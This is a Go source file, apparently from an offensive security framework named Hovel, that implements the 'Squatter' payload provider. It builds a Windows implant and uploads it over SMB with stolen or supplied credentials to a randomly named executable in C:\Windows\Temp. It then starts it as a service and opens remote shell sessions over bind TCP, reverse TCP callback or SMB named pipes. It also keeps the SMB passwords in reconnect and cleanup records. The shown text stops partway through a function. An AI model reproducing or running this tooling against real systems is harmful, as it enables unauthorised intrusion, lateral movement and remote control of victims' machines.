// Command squatter-provider is the Hovel payload_provider module for Squatter.
//
// The provider exposes Squatter payload metadata and packages the Windows agent
// binary built from payloads/squatter/windows/src.
package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/vibepwners/hovel/payloads/squatter/client/shell"
	"github.com/vibepwners/hovel/payloads/squatter/client/smbpipe"
	"github.com/vibepwners/hovel/payloads/squatter/client/wire"
	"github.com/vibepwners/hovel/payloads/squatter/client/xfer"
	"github.com/vibepwners/hovel/sdk/go/hovel"
)

const (
	version      = "v0.1.0"
	payloadName  = "squatter"
	platform     = "windows"
	arch         = "x86"
	minOS        = "windows-7"
	formatPEEXE  = hovel.PayloadFormatPEEXE
	reverseTCP   = "reverse-tcp"
	smbNamedPipe = "smb-named-pipe"
	tcpBind      = "tcp-bind"
	tcpCallback  = "tcp-callback"

	payloadRunfile       = "modules/squatter/windows/squatter.exe"
	legacyPayloadRunfile = "payloads/squatter/windows/squatter.exe"

	payloadConfigMagic          = "SQCFG001"
	payloadConfigKindOffset     = 8
	payloadConfigHostOffset     = 12
	payloadConfigPortOffset     = 16
	payloadConfigPipeOffset     = 18
	payloadConfigPipeCharacters = 128
	payloadConfigKindReverseTCP = 1
	payloadConfigKindSMBPipe    = 2
	payloadConfigKindTCPBind    = 3
)

// Provider implements Hovel's payload_provider contract for Squatter.
type Provider struct {
	lp         *placeholderLP
	installSMB func(hovel.StepExecuteRequest, smbInstallOptions) (smbInstallResult, error)
}

func newProvider() Provider {
	return Provider{lp: newPlaceholderLP(), installSMB: installSMB}
}

func (p Provider) listeningPost() *placeholderLP {
	if p.lp == nil {
		return newPlaceholderLP()
	}
	return p.lp
}

func (p Provider) install(req hovel.StepExecuteRequest, opts smbInstallOptions) (smbInstallResult, error) {
	if p.installSMB == nil {
		return installSMB(req, opts)
	}
	return p.installSMB(req, opts)
}

type smbInstallOptions struct {
	Host        string
	Port        int
	Domain      string
	Username    string
	Password    string
	RemotePath  string
	ServiceName string
	PipeName    string
	Payload     []byte
}

type smbInstallResult struct {
	RemotePath    string
	ServiceName   string
	BinaryPath    string
	BytesWritten  int
	ServiceStatus uint32
	ServiceState  uint32
	Win32ExitCode uint32
	QueryError    string
	LaunchMethod  string
	ATStatus      uint32
	ATJobID       uint32
}

func installSMB(_ hovel.StepExecuteRequest, opts smbInstallOptions) (smbInstallResult, error) {
	result, err := smbpipe.UploadAndStart(context.Background(), smbpipe.InstallOptions{
		Options: smbpipe.Options{
			Host:     opts.Host,
			Port:     opts.Port,
			Domain:   opts.Domain,
			Username: opts.Username,
			Password: opts.Password,
			Timeout:  defaultSMBTimeout(),
		},
		RemotePath:  opts.RemotePath,
		ServiceName: opts.ServiceName,
		Payload:     opts.Payload,
	})
	if err != nil {
		return smbInstallResult{}, err
	}
	return smbInstallResult{
		RemotePath:    result.RemotePath,
		ServiceName:   result.ServiceName,
		BinaryPath:    result.BinaryPath,
		BytesWritten:  result.BytesWritten,
		ServiceStatus: result.ServiceStatus,
		ServiceState:  result.ServiceState,
		Win32ExitCode: result.Win32ExitCode,
		QueryError:    result.QueryError,
		LaunchMethod:  result.LaunchMethod,
		ATStatus:      result.ATStatus,
		ATJobID:       result.ATJobID,
	}, nil
}

func (Provider) Info() hovel.Info {
	return hovel.Info{
		Name:        payloadName,
		Version:     version,
		Type:        hovel.TypePayloadProvider,
		Summary:     "Build Squatter payloads and open destination-scoped Mesh streams.",
		Description: "Core Hovel payload and Mesh provider for Squatter, including PKI-backed TLS streams.",
		Tags:        []string{"payload_provider", "mesh", "tls", "squatter", "windows", "lab", "dangerous"},
	}
}

func (Provider) Schema() hovel.Schema {
	return hovel.Schema{
		ChainConfig: []hovel.Requirement{
			enumReq("payload.transport", "Payload transport.", tcpBind, tcpCallback, smbNamedPipe, reverseTCP),
			enumReq("payload.format", "Payload artifact format.", formatPEEXE, hovel.PayloadFormatPE),
			hovel.Req("payload.lhost", "host", "TCP callback listener host."),
			hovel.Req("payload.lport", "port", "TCP callback listener port."),
			hovel.Req("payload.bind_port", "port", "TCP bind port opened by the payload on the target."),
			hovel.Req("payload.pipe", "string", "SMB named pipe for post-throw Squatter comms."),
			hovel.Req("smb.username", "string", "SMB username for credentialed upload/connect."),
			hovel.Req("smb.password", "string", "SMB password for credentialed upload/connect."),
			hovel.Req("smb.domain", "string", "SMB domain or local machine name."),
			hovel.Req("smb.port", "port", "SMB TCP port."),
		},
		Outputs: map[string]any{
			"payloads": "per-target Squatter payload artifact set",
		},
	}
}

func enumReq(key, description string, allowed ...string) hovel.Requirement {
	req := hovel.Req(key, "enum", description)
	req.Allowed = allowed
	return req
}

func (p Provider) Run(ctx *hovel.Context) (hovel.Result, error) {
	config := stringConfigFromContext(ctx)
	if config["payload.transport"] == "" {
		config["payload.transport"] = tcpBind
	}
	transport := canonicalTransport(config["payload.transport"])
	target := firstNonEmpty(config["target.host"], ctx.Target)
	ctx.Log.Info("connecting to Squatter session", "target", target, "transport", transport)
	lp := p.listeningPost()
	session, err := lp.ConnectSession(hovel.ConnectSessionRequest{
		RunID:     ctx.RunID,
		Target:    target,
		PayloadID: "squatter/windows/x86/windows-7/" + transport + "/pe-exe",
		Config:    config,
	})
	if err != nil {
		ctx.Log.Warn("Squatter session connection failed", "target", target, "error", err.Error())
		return hovel.Failed(
			"Squatter installed but session connection failed",
			hovel.WithFindings(hovel.Finding{
				Title:    "Squatter session connection failed",
				Severity: "high",
				Detail:   err.Error(),
			}),
		), nil
	}
	result := hovel.Ok(
		map[string]any{"target": target, "sessionId": session.ID, "transport": session.Transport},
		hovel.WithSummary("Squatter session connected"),
	)
	if transport == tcpBind {
		if conn, ok := lp.tcpBindConn(target); ok {
			ref, err := openSquatterSession(ctx, conn, "squatter/tcp-bind")
			if err != nil {
				return hovel.Result{}, err
			}
			result.Sessions = append(result.Sessions, ref)
			return result, nil
		}
	}
	if transport == smbNamedPipe {
		if conn, ok := lp.smbConn(target); ok {
			ref, err := openSquatterSession(ctx, conn, "squatter/smb-named-pipe")
			if err != nil {
				return hovel.Result{}, err
			}
			result.Sessions = append(result.Sessions, ref)
			return result, nil
		}
	}
	result.Sessions = append(result.Sessions, session)
	return result, nil
}

func openSquatterSession(ctx *hovel.Context, conn io.ReadWriteCloser, transport string) (hovel.SessionRef, error) {
	client := shell.New(conn)
	return ctx.OpenSession(
		&squatterSession{
			PTYSession: &hovel.PTYSession{Frontend: func(input io.Reader, output io.Writer) error {
				defer func() {
					if err := conn.Close(); err != nil {
						ctx.Log.Warn("Squatter session close failed", "error", err.Error())
					}
				}()
				inputFile, ok := input.(*os.File)
				if !ok {
					return fmt.Errorf("squatter PTY input is %T, want *os.File", input)
				}
				client.RunPromptIO(inputFile, output, transport)
				return nil
			}},
			client: client,
		},
		hovel.WithName("Squatter session"),
		hovel.WithKind("agent"),
		hovel.WithTransport(transport),
		hovel.WithCapabilities(capabilities()...),
	)
}

type squatterSession struct {
	*hovel.PTYSession
	client *shell.Client
}

func (s *squatterSession) ListPayloadCommands(req hovel.PayloadCommandListRequest) ([]hovel.PayloadCommand, error) {
	return Provider{}.ListPayloadCommands(req)
}

func (s *squatterSession) RunPayloadCommand(req hovel.PayloadCommandRequest) (result hovel.PayloadCommandResult, err error) {
	if s.client == nil {
		return hovel.PayloadCommandResult{}, fmt.Errorf("squatter session client is not configured")
	}
	err = s.client.WithLockedTransport(func(conn io.Writer, reader *bufio.Reader, sid uint64) error {
		result, err = runPayloadCommandOnTransport(conn, reader, sid, req)
		return err
	})
	return result, err
}

func stringConfigFromContext(ctx *hovel.Context) map[string]string {
	config := map[string]string{}
	for key, value := range ctx.ChainConfig {
		if text, ok := value.(string); ok {
			config[key] = text
		}
	}
	for key, value := range ctx.TargetConfig {
		if text, ok := value.(string); ok {
			config[key] = text
		}
	}
	return config
}

func (Provider) DescribeSteps() (hovel.StepContractSet, error) {
	return hovel.StepContractSet{
		Version: "squatter-provider/v1",
		Steps: []hovel.StepContract{
			{
				ID:   "squatter.generate",
				Kind: "payload.generate",
				ConfigSchema: map[string]any{
					"type": "object",
				},
				Produces: []hovel.CapabilityRequirement{
					capability(hovel.CapabilityPayloadArtifact, map[string]any{"provider": payloadName}),
				},
			},
			{
				ID:   "squatter.install_smb",
				Kind: "payload.install",
				Produces: []hovel.CapabilityRequirement{
					capability(hovel.CapabilityPayloadInstance, map[string]any{"provider": payloadName, "transport": smbNamedPipe}),
					capability(hovel.CapabilityTransport, map[string]any{"kind": "smb-pipe"}),
					capability(hovel.CapabilityCleanupHandle, map[string]any{"owner": payloadName}),
				},
				Prepare: hovel.StepPrepareContract{Materializes: []string{"staged_path", "service_name", "pipe_name"}},
			},
			{
				ID:   "squatter.connect_smb",
				Kind: "session.connector",
				Requires: []hovel.CapabilityRequirement{
					capabilityWithStates(hovel.CapabilityPayloadInstance, map[string]any{"provider": payloadName, "transport": smbNamedPipe}, "installed", "disconnected", "unreachable"),
					capability(hovel.CapabilityTransport, map[string]any{"kind": "smb-pipe"}),
				},
				Produces: []hovel.CapabilityRequirement{
					capability(hovel.CapabilitySessionRef, map[string]any{"provider": payloadName, "transport": smbNamedPipe}),
				},
			},
			{
				ID:   "squatter.connect_tcp_bind",
				Kind: "session.connector",
				Requires: []hovel.CapabilityRequirement{
					capabilityWithStates(hovel.CapabilityPayloadInstance, map[string]any{"provider": payloadName, "transport": tcpBind}, "installed", "disconnected", "unreachable"),
					capability(hovel.CapabilityTransport, map[string]any{"kind": "tcp-endpoint"}),
				},
				Produces: []hovel.CapabilityRequirement{
					capability(hovel.CapabilitySessionRef, map[string]any{"provider": payloadName, "transport": tcpBind}),
				},
			},
			{
				ID:   "squatter.listen_tcp_callback",
				Kind: "listener.start",
				Produces: []hovel.CapabilityRequirement{
					capability(hovel.CapabilityTransport, map[string]any{"kind": "tcp-listener"}),
					capability(hovel.CapabilityCleanupHandle, map[string]any{"owner": payloadName}),
				},
				Prepare: hovel.StepPrepareContract{Materializes: []string{"listen_host", "listen_port"}},
			},
			{
				ID:   "squatter.connect_tcp_callback",
				Kind: "session.connector",
				Requires: []hovel.CapabilityRequirement{
					capabilityWithStates(hovel.CapabilityPayloadInstance, map[string]any{"provider": payloadName, "transport": tcpCallback}, "installed", "disconnected", "unreachable"),
					capability(hovel.CapabilityTransport, map[string]any{"kind": "tcp-listener"}),
				},
				Produces: []hovel.CapabilityRequirement{
					capability(hovel.CapabilitySessionRef, map[string]any{"provider": payloadName, "transport": tcpCallback}),
				},
			},
		},
	}, nil
}

func capability(capabilityType hovel.CapabilityType, attributes map[string]any) hovel.CapabilityRequirement {
	return capabilityWithStates(capabilityType, attributes)
}

func capabilityWithStates(capabilityType hovel.CapabilityType, attributes map[string]any, states ...string) hovel.CapabilityRequirement {
	return hovel.CapabilityRequirement{
		Type:          capabilityType,
		SchemaVersion: "v1",
		Attributes:    attributes,
		States:        states,
	}
}

func (Provider) PrepareStep(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
	if req.StepID == "squatter.install_smb" {
		return prepareSMBInstall(req)
	}
	if req.StepID == "squatter.install_tcp_bind" {
		return prepareTCPBindInstall(req)
	}
	if req.StepID == "squatter.listen_tcp_callback" {
		return prepareTCPCallbackListener(req)
	}
	if req.StepID == "squatter.install_tcp_callback" {
		return prepareTCPCallbackInstall(req)
	}
	return hovel.StepPrepareResult{
		PreparedValues: map[string]hovel.PreparedValue{},
		OperatorSummary: hovel.OperatorSummary{
			Warnings: []string{"squatter step preparation is not implemented yet"},
		},
		Evidence: []hovel.Evidence{{
			ID:           "ev_squatter_prepare_not_implemented",
			Level:        "warning",
			Kind:         "step.prepare.not_implemented",
			SourceStepID: req.StepID,
			Message:      "squatter step preparation is not implemented yet",
		}},
	}, nil
}

func prepareTCPBindInstall(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
	stagedPath, serviceName, err := preparedInstallNames(req)
	if err != nil {
		return hovel.StepPrepareResult{}, err
	}
	bindPort, err := preparedString(req.ExistingPreparedValues, "bind_port", func() (string, error) {
		if port, ok := stringConfig(req.Config, "payload.bind_port"); ok && port != "" {
			return port, nil
		}
		return "9100", nil
	})
	if err != nil {
		return hovel.StepPrepareResult{}, err
	}
	return hovel.StepPrepareResult{
		PlannedOutputs: []hovel.Capability{
			payloadInstanceCapability(req.StepID, tcpBind, "cap_payload_instance_tcp_bind_"+serviceName, stagedPath, serviceName),
			{
				ID:             "cap_endpoint_tcp_bind_" + serviceName,
				Type:           hovel.CapabilityTransport,
				SchemaVersion:  "v1",
				State:          "planned",
				ProducerStepID: req.StepID,
				Attributes: map[string]any{
					"kind": "tcp-endpoint",
					"port": bindPort,
				},
			},
			cleanupCapability(req.StepID, "cap_cleanup_"+serviceName, stagedPath, serviceName),
		},
		PreparedValues: map[string]hovel.PreparedValue{
			"staged_path":  {Value: stagedPath, Editable: true},
			"service_name": {Value: serviceName, Editable: true},
			"bind_port":    {Value: bindPort, Editable: true},
		},
		OperatorSummary: hovel.OperatorSummary{
			TargetSideArtifacts: []string{
				stagedPath,
				"service " + serviceName,
				"TCP bind port " + bindPort,
			},
		},
	}, nil
}

func prepareTCPCallbackListener(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
	host, _ := stringConfig(req.Config, "payload.lhost")
	if host == "" {
		host = "127.0.0.1"
	}
	port, _ := stringConfig(req.Config, "payload.lport")
	if port == "" {
		port = "0"
	}
	return hovel.StepPrepareResult{
		PlannedOutputs: []hovel.Capability{
			{
				ID:             "cap_listener_tcp_callback_" + sanitizeCapabilitySuffix(host+"_"+port),
				Type:           hovel.CapabilityTransport,
				SchemaVersion:  "v1",
				State:          "planned",
				ProducerStepID: req.StepID,
				Attributes: map[string]any{
					"kind": "tcp-listener",
					"host": host,
					"port": port,
				},
			},
		},
		PreparedValues: map[string]hovel.PreparedValue{
			"listen_host": {Value: host, Editable: true},
			"listen_port": {Value: port, Editable: true},
		},
		OperatorSummary: hovel.OperatorSummary{
			TargetSideArtifacts: []string{"callback to " + net.JoinHostPort(host, port)},
		},
	}, nil
}

func prepareTCPCallbackInstall(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
	stagedPath, serviceName, err := preparedInstallNames(req)
	if err != nil {
		return hovel.StepPrepareResult{}, err
	}
	return hovel.StepPrepareResult{
		PlannedOutputs: []hovel.Capability{
			payloadInstanceCapability(req.StepID, tcpCallback, "cap_payload_instance_tcp_callback_"+serviceName, stagedPath, serviceName),
			cleanupCapability(req.StepID, "cap_cleanup_"+serviceName, stagedPath, serviceName),
		},
		PreparedValues: map[string]hovel.PreparedValue{
			"staged_path":  {Value: stagedPath, Editable: true},
			"service_name": {Value: serviceName, Editable: true},
		},
		OperatorSummary: hovel.OperatorSummary{
			TargetSideArtifacts: []string{
				stagedPath,
				"service " + serviceName,
				"TCP callback",
			},
		},
	}, nil
}

func preparedInstallNames(req hovel.StepPrepareRequest) (string, string, error) {
	stagedPath, err := preparedString(req.ExistingPreparedValues, "staged_path", func() (string, error) {
		if remotePath, ok := stringConfig(req.Config, "payload.remote_path"); ok && remotePath != "" {
			return remotePath, nil
		}
		token, err := randomToken(6)
		if err != nil {
			return "", err
		}
		return `C:\Windows\Temp\` + token + ".exe", nil
	})
	if err != nil {
		return "", "", err
	}
	serviceName, err := preparedString(req.ExistingPreparedValues, "service_name", func() (string, error) {
		return randomToken(5)
	})
	if err != nil {
		return "", "", err
	}
	return stagedPath, serviceName, nil
}

func payloadInstanceCapability(stepID, transport, id, stagedPath, serviceName string) hovel.Capability {
	return hovel.Capability{
		ID:             id,
		Type:           hovel.CapabilityPayloadInstance,
		SchemaVersion:  "v1",
		State:          "planned",
		ProducerStepID: stepID,
		Attributes: map[string]any{
			"provider":     payloadName,
			"transport":    transport,
			"staged_path":  stagedPath,
			"service_name": serviceName,
		},
	}
}

func cleanupCapability(stepID, id, stagedPath, serviceName string) hovel.Capability {
	return hovel.Capability{
		ID:             id,
		Type:           hovel.CapabilityCleanupHandle,
		SchemaVersion:  "v1",
		State:          "planned",
		ProducerStepID: stepID,
		Attributes: map[string]any{
			"owner":        payloadName,
			"staged_path":  stagedPath,
			"service_name": serviceName,
		},
	}
}

func stringConfig(values map[string]any, key string) (string, bool) {
	value, ok := values[key]
	if !ok {
		return "", false
	}
	text, ok := value.(string)
	return text, ok
}

func sanitizeCapabilitySuffix(value string) string {
	replacer := strings.NewReplacer(":", "_", ".", "_", "/", "_", "\\", "_", "[", "_", "]", "_")
	return replacer.Replace(value)
}

func prepareSMBInstall(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
	stagedPath, err := preparedString(req.ExistingPreparedValues, "staged_path", func() (string, error) {
		if remotePath, ok := stringConfig(req.Config, "payload.remote_path"); ok && remotePath != "" {
			return remotePath, nil
		}
		token, err := randomToken(6)
		if err != nil {
			return "", err
		}
		return `C:\Windows\Temp\` + token + ".exe", nil
	})
	if err != nil {
		return hovel.StepPrepareResult{}, err
	}
	serviceName, err := preparedString(req.ExistingPreparedValues, "service_name", func() (string, error) {
		return randomToken(5)
	})
	if err != nil {
		return hovel.StepPrepareResult{}, err
	}
	pipeName, err := preparedString(req.ExistingPreparedValues, "pipe_name", func() (string, error) {
		if pipe, ok := stringConfig(req.Config, "payload.pipe"); ok && pipe != "" {
			return smbpipe.NormalizePipePath(pipe), nil
		}
		return randomToken(6)
	})
	if err != nil {
		return hovel.StepPrepareResult{}, err
	}

	return hovel.StepPrepareResult{
		PlannedOutputs: []hovel.Capability{
			{
				ID:             "cap_payload_instance_" + pipeName,
				Type:           hovel.CapabilityPayloadInstance,
				SchemaVersion:  "v1",
				State:          "planned",
				ProducerStepID: req.StepID,
				Attributes: map[string]any{
					"provider":     payloadName,
					"transport":    smbNamedPipe,
					"staged_path":  stagedPath,
					"service_name": serviceName,
				},
			},
			{
				ID:             "cap_endpoint_smb_pipe_" + pipeName,
				Type:           hovel.CapabilityTransport,
				SchemaVersion:  "v1",
				State:          "planned",
				ProducerStepID: req.StepID,
				Attributes: map[string]any{
					"kind":      "smb-pipe",
					"pipe_name": pipeName,
				},
			},
			{
				ID:             "cap_cleanup_" + serviceName,
				Type:           hovel.CapabilityCleanupHandle,
				SchemaVersion:  "v1",
				State:          "planned",
				ProducerStepID: req.StepID,
				Attributes: map[string]any{
					"owner":        payloadName,
					"staged_path":  stagedPath,
					"service_name": serviceName,
				},
			},
		},
		PreparedValues: map[string]hovel.PreparedValue{
			"staged_path":  {Value: stagedPath, Editable: true},
			"service_name": {Value: serviceName, Editable: true},
			"pipe_name":    {Value: pipeName, Editable: true},
		},
		OperatorSummary: hovel.OperatorSummary{
			TargetSideArtifacts: []string{
				stagedPath,
				"service " + serviceName,
				`\\.\pipe\` + pipeName,
			},
		},
	}, nil
}

func preparedString(values map[string]hovel.PreparedValue, key string, generate func() (string, error)) (string, error) {
	if values != nil {
		if existing, ok := values[key]; ok {
			if text, ok := existing.Value.(string); ok && text != "" {
				return text, nil
			}
		}
	}
	return generate()
}

func randomToken(byteCount int) (string, error) {
	buf := make([]byte, byteCount)
	if _, err := rand.Read(buf); err != nil {
		return "", err
	}
	return hex.EncodeToString(buf), nil
}

func (p Provider) ExecuteStep(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
	switch req.StepID {
	case "squatter.generate":
		return p.executeGenerate(req)
	case "squatter.install_smb":
		return p.executeSMBInstall(req)
	case "squatter.listen_tcp_callback":
		return p.executeTCPCallbackListen(req)
	case "squatter.connect_tcp_bind":
		return p.executeTCPConnect(req, tcpBind)
	case "squatter.connect_tcp_callback":
		return p.executeTCPConnect(req, tcpCallback)
	case "squatter.connect_smb":
		return p.executeSMBConnect(req)
	}
	return hovel.StepExecuteResult{
		Status: "failed",
		Evidence: []hovel.Evidence{{
			ID:           "ev_squatter_execute_not_implemented",
			Level:        "warning",
			Kind:         "step.execute.not_implemented",
			SourceStepID: req.StepID,
			Message:      "squatter step execution is not implemented yet",
		}},
	}, nil
}

func (p Provider) executeGenerate(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
	config := stringMapFromAny(req.RunMetadata["config"])
	if config == nil {
		config = map[string]string{}
	}
	transport := canonicalTransport(config["payload.transport"])
	if transport == "" {
		transport = tcpBind
	}
	config["payload.transport"] = transport
	target := firstNonEmpty(config["target.host"], config["smb.host"], "target")
	payloadID := "squatter/windows/x86/windows-7/" + transport + "/" + formatPEEXE
	artifactSet, err := p.GeneratePayload(hovel.GeneratePayloadRequest{
		RunID:     req.RunID,
		Target:    target,
		PayloadID: payloadID,
		Format:    formatPEEXE,
		Config:    config,
	})
	if err != nil {
		return hovel.StepExecuteResult{
			Status: "generate_failed",
			Evidence: []hovel.Evidence{{
				ID:           "ev_squatter_generate_failed",
				Level:        "warning",
				Kind:         "payload.generate.failed",
				SourceStepID: req.StepID,
				Message:      "Squatter payload generation failed",
				Details:      map[string]any{"error": err.Error(), "transport": transport},
			}},
		}, nil
	}
	return hovel.StepExecuteResult{
		Status: "succeeded",
		Capabilities: []hovel.Capability{{
			ID:             "cap_payload_artifact_" + sanitizeCapabilitySuffix(transport+"_"+target),
			Type:           hovel.CapabilityPayloadArtifact,
			SchemaVersion:  "v1",
			State:          "built",
			ProducerStepID: req.StepID,
			Attributes: map[string]any{
				"provider":      payloadName,
				"payload_id":    payloadID,
				"transport":     transport,
				"format":        artifactSet.Primary.Format,
				"artifact_name": artifactSet.Primary.Name,
				"sha256":        artifactSet.Primary.SHA256,
				"size":          artifactSet.Primary.Size,
			},
		}},
		Evidence: []hovel.Evidence{{
			ID:           "ev_squatter_generate",
			Level:        "info",
			Kind:         "payload.generate",
			SourceStepID: req.StepID,
			Message:      "Squatter payload generated",
			Details: map[string]any{
				"payload_id": payloadID,
				"transport":  transport,
				"format":     artifactSet.Primary.Format,
				"sha256":     artifactSet.Primary.SHA256,
				"size":       artifactSet.Primary.Size,
			},
		}},
	}, nil
}

func (p Provider) executeSMBInstall(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
	config := stringMapFromAny(req.RunMetadata["config"])
	if config == nil {
		config = map[string]string{}
	}
	config["payload.transport"] = smbNamedPipe
	prepared := stringMapFromAny(req.ConfirmedPreparedValues)
	target := firstNonEmpty(config["target.host"], config["smb.host"])
	remotePath := firstNonEmpty(prepared["staged_path"], config["payload.remote_path"])
	serviceName := firstNonEmpty(prepared["service_name"], config["service.name"])
	pipeName := firstNonEmpty(prepared["pipe_name"], normalizeNamedPipe(config["payload.pipe"]))
	if target == "" || remotePath == "" || serviceName == "" || pipeName == "" {
		return hovel.StepExecuteResult{}, fmt.Errorf("squatter.install_smb missing target, staged_path, service_name, or pipe_name")
	}
	config["payload.pipe"] = `\\.\pipe\` + smbpipe.NormalizePipePath(pipeName)

	artifact, err := p.GeneratePayload(hovel.GeneratePayloadRequest{
		RunID:     req.RunID,
		Target:    target,
		PayloadID: "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe",
		Format:    formatPEEXE,
		Config:    config,
	})
	if err != nil {
		return hovel.StepExecuteResult{}, err
	}
	payload, err := base64.StdEncoding.DecodeString(artifact.Primary.Bytes)
	if err != nil {
		return hovel.StepExecuteResult{}, err
	}
	installOpts, err := smbInstallOptionsFromConfig(config, target, remotePath, serviceName, pipeName, payload)
	if err != nil {
		return hovel.StepExecuteResult{}, err
	}
	install, err := p.install(req, installOpts)
	if err != nil {
		return hovel.StepExecuteResult{
			Status: "install_failed",
			Evidence: []hovel.Evidence{{
				ID:           "ev_squatter_install_smb_failed",
				Level:        "warning",
				Kind:         "payload.install.failed",
				SourceStepID: req.StepID,
				Message:      "Squatter SMB credentialed install failed",
				Details:      map[string]any{"error": err.Error(), "target": target},
			}},
		}, nil
	}
	return hovel.StepExecuteResult{
		Status: "succeeded",
		Capabilities: []hovel.Capability{
			{
				ID:             "cap_payload_instance_" + sanitizeCapabilitySuffix(serviceName),
				Type:           hovel.CapabilityPayloadInstance,
				SchemaVersion:  "v1",
				State:          "installed",
				ProducerStepID: req.StepID,
				Attributes: map[string]any{
					"provider":       payloadName,
					"transport":      smbNamedPipe,
					"staged_path":    install.RemotePath,
					"service_name":   install.ServiceName,
					"bytes_written":  install.BytesWritten,
					"service_status": fmt.Sprintf("0x%08x", install.ServiceStatus),
					"service_state":  fmt.Sprintf("0x%08x", install.ServiceState),
					"win32_exit":     fmt.Sprintf("0x%08x", install.Win32ExitCode),
					"query_error":    install.QueryError,
					"launch_method":  install.LaunchMethod,
					"atsvc_status":   fmt.Sprintf("0x%08x", install.ATStatus),
					"atsvc_job_id":   install.ATJobID,
				},
			},
			{
				ID:             "cap_endpoint_smb_pipe_" + sanitizeCapabilitySuffix(pipeName),
				Type:           hovel.CapabilityTransport,
				SchemaVersion:  "v1",
				State:          "active",
				ProducerStepID: req.StepID,
				Attributes: map[string]any{
					"kind":      "smb-pipe",
					"pipe_name": pipeName,
				},
			},
			cleanupCapability(req.StepID, "cap_cleanup_"+sanitizeCapabilitySuffix(serviceName), install.RemotePath, install.ServiceName),
		},
		Evidence: []hovel.Evidence{{
			ID:           "ev_squatter_install_smb",
			Level:        "info",
			Kind:         "payload.install",
			SourceStepID: req.StepID,
			Message:      "Squatter uploaded and started over SMB with supplied credentials",
			Details: map[string]any{
				"target":         target,
				"remote_path":    install.RemotePath,
				"service_name":   install.ServiceName,
				"binary_path":    install.BinaryPath,
				"bytes_written":  install.BytesWritten,
				"service_status": fmt.Sprintf("0x%08x", install.ServiceStatus),
				"service_state":  fmt.Sprintf("0x%08x", install.ServiceState),
				"win32_exit":     fmt.Sprintf("0x%08x", install.Win32ExitCode),
				"query_error":    install.QueryError,
				"launch_method":  install.LaunchMethod,
				"atsvc_status":   fmt.Sprintf("0x%08x", install.ATStatus),
				"atsvc_job_id":   install.ATJobID,
				"pipe_name":      pipeName,
			},
		}},
		InstalledPayloads: []hovel.InstalledPayloadDescriptor{
			installedSMBPayloadDescriptor(target, config, install, pipeName),
		},
	}, nil
}

func installedSMBPayloadDescriptor(target string, config map[string]string, install smbInstallResult, pipeName string) hovel.InstalledPayloadDescriptor {
	pipePath := `\\.\pipe\` + smbpipe.NormalizePipePath(pipeName)
	endpoint := `\\` + target + `\pipe\` + smbpipe.NormalizePipePath(pipeName)
	return hovel.InstalledPayloadDescriptor{
		Provider:                 payloadName,
		PayloadID:                "squatter/windows/x86/windows-7/" + smbNamedPipe + "/" + formatPEEXE,
		PayloadVersion:           version,
		Target:                   target,
		TargetID:                 target,
		State:                    "installed",
		Transport:                smbNamedPipe,
		Endpoint:                 endpoint,
		InstanceKey:              strings.Join([]string{payloadName, smbNamedPipe, target, pipeName}, ":"),
		StampID:                  install.ServiceName,
		SupportsReconnect:        true,
		SupportsMultipleSessions: true,
		Reconnect: &hovel.PayloadProviderRecord{
			ProviderID:    payloadName,
			Schema:        "squatter.smb_named_pipe.reconnect",
			SchemaVersion: "v1",
			Descriptor: map[string]any{
				"transport":     smbNamedPipe,
				"target.host":   target,
				"smb.host":      firstNonEmpty(config["smb.host"], target),
				"smb.port":      config["smb.port"],
				"smb.domain":    config["smb.domain"],
				"smb.username":  config["smb.username"],
				"smb.password":  config["smb.password"],
				"payload.pipe":  pipePath,
				"pipe":          pipeName,
				"remotePath":    install.RemotePath,
				"serviceName":   install.ServiceName,
				"binaryPath":    install.BinaryPath,
				"launchMethod":  install.LaunchMethod,
				"bytesWritten":  install.BytesWritten,
				"serviceStatus": fmt.Sprintf("0x%08x", install.ServiceStatus),
				"serviceState":  fmt.Sprintf("0x%08x", install.ServiceState),
				"win32Exit":     fmt.Sprintf("0x%08x", install.Win32ExitCode),
				"queryError":    install.QueryError,
				"atsvcStatus":   fmt.Sprintf("0x%08x", install.ATStatus),
				"atsvcJobId":    install.ATJobID,
			},
		},
		Cleanup: &hovel.PayloadProviderRecord{
			ProviderID:    payloadName,
			Schema:        "squatter.smb_named_pipe.cleanup",
			SchemaVersion: "v1",
			Descriptor: map[string]any{
				"target.host":  target,
				"smb.host":     firstNonEmpty(config["smb.host"], target),
				"smb.port":     config["smb.port"],
				"smb.domain":   config["smb.domain"],
				"smb.username": config["smb.username"],
				"smb.password": config["smb.password"],
				"remotePath":   install.RemotePath,
				"serviceName":  install.ServiceName,
			},
		},
		Metadata: map[string]string{
			"launch_method": install.LaunchMethod,
			"bytes_written": strconv.Itoa(install.BytesWritten),
		},
	}
}

func smbInstallOptionsFromConfig(config map[string]string, target, remotePath, serviceName, pipeName string, payload []byte) (smbInstallOptions, error) {
	port := 0
	if text := config["smb.port"]; text != "" {
		parsed, err := strconv.Atoi(text)
		if err != nil {
			return smbInstallOptions{}, fmt.Errorf("smb.port is not valid: %w", err)
		}
		port = parsed
	}
	opts := smbInstallOptions{
		Host:        firstNonEmpty(config["smb.host"], target),
		Port:        port,
		Domain:      config["smb.domain"],
		Username:    config["smb.username"],
		Password:    config["smb.password"],
		RemotePath:  remotePath,
		ServiceName: serviceName,
		PipeName:    pipeName,
		Payload:     payload,
	}
	if opts.Host == "" {
		return smbInstallOptions{}, fmt.Errorf("target.host or smb.host is required for Squatter SMB install")
	}
	if opts.Username == "" {
		return smbInstallOptions{}, fmt.Errorf("smb.username is required for Squatter SMB install")
	}
	if opts.Password == "" {
		return smbInstallOptions{}, fmt.Errorf("smb.password is required for Squatter SMB install")
	}
	return opts, nil
}

func defaultSMBTimeout() time.Duration {
	return 10 * time.Second
}

func (p Provider) executeTCPCallbackListen(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
